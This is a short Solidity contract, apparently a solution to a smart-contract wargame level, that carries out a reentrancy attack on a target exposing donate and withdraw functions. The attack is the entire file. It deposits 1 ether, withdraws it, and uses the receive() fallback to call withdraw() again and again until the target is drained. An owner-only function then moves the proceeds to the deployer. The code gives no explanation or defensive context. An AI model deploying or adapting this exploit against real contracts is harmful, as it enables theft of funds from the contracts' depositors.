// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    address public target;
    address public owner;

    constructor(address _target) public {
        target = _target;
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        IReentrance(target).donate{value: 1 ether}(address(this));
        IReentrance(target).withdraw(1 ether);
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;
        if (targetBalance >= 1 ether) {
            IReentrance(target).withdraw(1 ether);
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
